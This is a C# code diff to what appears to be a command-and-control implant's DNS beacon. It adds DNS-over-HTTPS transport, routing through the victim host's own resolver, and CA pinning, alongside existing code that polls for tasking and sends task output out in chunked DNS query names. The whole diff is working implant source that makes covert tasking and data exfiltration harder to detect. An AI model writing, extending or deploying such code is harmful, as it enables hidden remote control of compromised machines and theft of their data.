@@ -163,8 +163,9 @@ internal sealed class DnsBeacon : ICheckInClient
     // resolver -- a DNS carrier answering garbage is not a front to trust.
     private async Task<bool> RunOnceAsync(CancellationToken cancellationToken)
     {
-        var (host, port, zone) = DnsDial.Parse(_egress.CurrentBeaconUrl);
-        var answer = await DnsDial.QueryAsync(host, port, DnsNames.PollName(_implantId, zone), cancellationToken);
+        var (_, _, zone, _) = DnsDial.Parse(_egress.CurrentBeaconUrl);
+        var answer = await DnsDial.QueryAsync(
+            _egress.CurrentBeaconUrl, DnsNames.PollName(_implantId, zone), _cas, cancellationToken);
         if (answer is null)
             return true; // a quiet poll: presence refreshed, no tasking
 
@@ -209,7 +210,7 @@ internal sealed class DnsBeacon : ICheckInClient
     public async Task ReportAsync(
         string taskId, TaskOutcome outcome, string output, CancellationToken cancellationToken)
     {
-        var (host, port, zone) = DnsDial.Parse(_egress.CurrentBeaconUrl);
+        var (_, _, zone, _) = DnsDial.Parse(_egress.CurrentBeaconUrl);
         var bytes = Encoding.UTF8.GetBytes(output);
         var succeeded = outcome == TaskOutcome.Succeeded;
         var chunks = (bytes.Length + ChunkBytes - 1) / ChunkBytes;
@@ -221,7 +222,7 @@ internal sealed class DnsBeacon : ICheckInClient
                 Array.Copy(bytes, index * ChunkBytes, chunk, 0, take);
             var terminal = index == Math.Max(chunks, 1) - 1;
             var name = DnsNames.ResultName(_implantId, taskId, succeeded, index, terminal, chunk, zone);
-            await DnsDial.QueryAsync(host, port, name, cancellationToken, queryOnly: true);
+            await DnsDial.QueryAsync(_egress.CurrentBeaconUrl, name, _cas, cancellationToken, queryOnly: true);
         }
         _log.WriteLine($"dns result reported: task {taskId} in {Math.Max(chunks, 1)} chunk(s)");
     }
@@ -230,23 +231,35 @@ internal sealed class DnsBeacon : ICheckInClient
 /// <summary>
 /// The DNS dial and wire codec (RFC 1035's minimal TXT subset): one
 /// question with an EDNS0 OPT record, answers parsed with compression
-/// support, TXT strings concatenated back into one payload.
+/// support, TXT strings concatenated back into one payload. The dial's
+/// two carriages (extending/implants.md): raw UDP to the named resolver,
+/// or RFC 8484 HTTPS -- the wire message riding a POST body to /dns-query
+/// with the enrolled CA chain as the TLS trust anchor.
 /// </summary>
 internal static class DnsDial
 {
-    public static (string Host, int Port, string Zone) Parse(string beaconUrl)
+    public static (string? Host, int Port, string Zone, bool DoH) Parse(string beaconUrl)
     {
-        var rest = beaconUrl.Trim()["dns://".Length..];
+        var trimmed = beaconUrl.Trim();
+        var doh = trimmed.StartsWith("doh://", StringComparison.OrdinalIgnoreCase);
+        var rest = trimmed[(doh ? "doh://" : "dns://").Length..];
         var slash = rest.IndexOf('/');
+
+        // dns://zone (no authority): the system's own resolver -- the
+        // queries ride whatever DNS server the host is configured to use,
+        // the production shape for a delegated zone. DoH names its
+        // resolver: the carriage is an HTTPS URL the host does not carry.
+        if (slash < 0 && !doh)
+            return (null, 53, rest.TrimEnd('.').ToLowerInvariant(), DoH: false);
         if (slash <= 0 || slash == rest.Length - 1)
             throw new NotSupportedException(
-                $"A dns:// beacon URL names a resolver and a zone: dns://resolver[:port]/zone, got '{beaconUrl}'.");
+                $"A {(doh ? "doh" : "dns")}:// beacon URL names a resolver and a zone ({(doh ? "doh" : "dns")}://resolver[:port]/zone) or a bare zone (dns://zone), got '{beaconUrl}'.");
         var authority = rest[..slash];
         var zone = rest[(slash + 1)..].TrimEnd('.').ToLowerInvariant();
         if (zone.Length == 0)
-            throw new NotSupportedException($"A dns:// beacon URL names a zone, got '{beaconUrl}'.");
+            throw new NotSupportedException($"A dns/doh beacon URL names a zone, got '{beaconUrl}'.");
 
-        int port = 53;
+        int port = doh ? 443 : 53;
         string host;
         if (authority.StartsWith('['))
         {
@@ -254,9 +267,11 @@ internal static class DnsDial
             if (close < 0)
                 throw new NotSupportedException($"Malformed resolver address '{authority}'.");
             host = authority[1..close];
-            if (close + 2 <= authority.Length && authority[close + 1] == ':'
-                && !int.TryParse(authority[(close + 2)..], out port))
-                throw new NotSupportedException($"Malformed resolver port in '{authority}'.");
+            if (close + 2 <= authority.Length && authority[close + 1] == ':')
+            {
+                if (!int.TryParse(authority[(close + 2)..], out port))
+                    throw new NotSupportedException($"Malformed resolver port in '{authority}'.");
+            }
         }
         else
         {
@@ -272,22 +287,96 @@ internal static class DnsDial
                 host = authority;
             }
         }
-        return (host, port, zone);
+        return (host, port, zone, doh);
     }
 
     /// <summary>
-    /// One TXT exchange. Returns the concatenated payload bytes of the
-    /// first TXT answer, or null when the answer carries none (a quiet
-    /// poll). <paramref name="queryOnly"/> sends the query and reads the
-    /// answer without collecting payloads (the result path's empty
-    /// NOERROR).
+    /// One TXT exchange over whichever carriage the beacon URL names. A
+    /// null-host dns:// dial rides the system's resolver. Returns the
+    /// concatenated payload bytes of the first TXT answer, or null when
+    /// the answer carries none (a quiet poll).
     /// </summary>
     public static async Task<byte[]?> QueryAsync(
-        string host, int port, string name, CancellationToken cancellationToken,
-        bool queryOnly = false, string? zoneForLabel = null)
+        string beaconUrl,
+        string name,
+        IReadOnlyList<System.Security.Cryptography.X509Certificates.X509Certificate2>? pinnedCas,
+        CancellationToken cancellationToken,
+        bool queryOnly = false)
+    {
+        var (host, port, _, doh) = Parse(beaconUrl);
+        var query = EncodeQuery(name);
+        byte[] datagram;
+        if (doh)
+        {
+            if (host is null)
+                throw new NotSupportedException("A doh:// beacon URL names its resolver; the system resolver is the UDP carriage's.");
+            datagram = await PostWireAsync(host, port, query, pinnedCas, cancellationToken);
+        }
+        else
+        {
+            var (resolverHost, resolverPort) = host is null ? SystemResolver() : (host, port);
+            datagram = await UdpExchangeAsync(resolverHost, resolverPort, query, cancellationToken);
+        }
+        return ParseAnswer(datagram, query, queryOnly);
+    }
+
+    /// <summary>
+    /// The host's configured resolver (the production dial for a delegated
+    /// zone): the first non-loopback DNS address the interfaces report,
+    /// falling back to the loopback resolver when nothing else exists.
+    /// </summary>
+    public static (string Host, int Port) SystemResolver()
+    {
+        foreach (var nic in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces())
+        {
+            if (nic.OperationalStatus != System.Net.NetworkInformation.OperationalStatus.Up)
+                continue;
+            foreach (var dns in nic.GetIPProperties().DnsAddresses)
+            {
+                if (System.Net.IPAddress.IsLoopback(dns))
+                    continue;
+                return (dns.ToString(), 53);
+            }
+        }
+        return ("127.0.0.1", 53);
+    }
+
+    // RFC 8484: one POST, application/dns-message, the wire query as the
+    // body, the wire answer as the response body. TLS anchors to the
+    // enrolled CA chain -- the same pin the web fronts use, so a lab cert
+    // chains exactly like a production one.
+    private static async Task<byte[]> PostWireAsync(
+        string host,
+        int port,
+        byte[] query,
+        IReadOnlyList<System.Security.Cryptography.X509Certificates.X509Certificate2>? pinnedCas,
+        CancellationToken cancellationToken)
+    {
+        using var handler = new HttpClientHandler
+        {
+            ServerCertificateCustomValidationCallback = (_, certificate, chain, _) =>
+            {
+                if (certificate is null || chain is null)
+                    return false;
+                chain.ChainPolicy.TrustMode = System.Security.Cryptography.X509Certificates.X509ChainTrustMode.CustomRootTrust;
+                foreach (var ca in pinnedCas ?? Array.Empty<System.Security.Cryptography.X509Certificates.X509Certificate2>())
+                    chain.ChainPolicy.CustomTrustStore.Add(ca);
+                return chain.Build(certificate);
+            },
+        };
+        using var http = new HttpClient(handler) { Timeout = ExchangeTimeout };
+        using var content = new ByteArrayContent(query);
+        content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/dns-message");
+        using var response = await http.PostAsync($"https://{host}:{port}/dns-query", content, cancellationToken);
+        if (!response.IsSuccessStatusCode)
+            throw new HttpRequestException($"the DoH carriage answered {response.StatusCode}");
+        return await response.Content.ReadAsByteArrayAsync(cancellationToken);
+    }
+
+    private static async Task<byte[]> UdpExchangeAsync(
+        string host, int port, byte[] query, CancellationToken cancellationToken)
     {
         using var udp = new UdpClient();
-        var query = EncodeQuery(name);
         await udp.SendAsync(query, query.Length, host, port);
 
         using var wait = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
@@ -301,11 +390,8 @@ internal static class DnsDial
         {
             throw new TimeoutException($"the resolver {host}:{port} did not answer within {ExchangeTimeout.TotalSeconds:0}s");
         }
-        return ParseAnswer(datagram.Buffer, query, queryOnly);
+        return datagram.Buffer;
     }
-
-    // A result query still reads its answer (the exchange's NOERROR) --
-    // the call sites pass queryOnly, and the payloads only the poll reads.
 
     private static readonly TimeSpan ExchangeTimeout = TimeSpan.FromSeconds(5);
 
